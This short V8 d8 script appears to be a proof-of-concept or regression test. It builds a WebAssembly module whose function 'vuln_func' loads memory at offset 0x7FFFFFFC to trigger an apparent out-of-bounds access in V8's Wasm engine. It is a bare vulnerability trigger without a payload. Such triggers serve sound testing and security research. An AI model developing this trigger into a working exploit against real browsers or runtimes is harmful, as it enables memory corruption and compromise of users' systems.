d8.file.execute("/src/v8/test/mjsunit/wasm/wasm-module-builder.js");

const MEMORY_PAGES = 65535;
const VULN_OFFSET = 0x7FFFFFFC;

const builder = new WasmModuleBuilder();
builder.addMemory(MEMORY_PAGES);
builder.addFunction("vuln_func", kSig_l_v)
    .addBody([
        kExprI32Const, 0,
        kExprI64LoadMem, 3, ...wasmUnsignedLeb(VULN_OFFSET),
        kExprI64Const, 32,
        kExprI64ShrU
    ])
    .exportFunc();

const instance = builder.instantiate();
const vuln_func = instance.exports.vuln_func;
vuln_func();
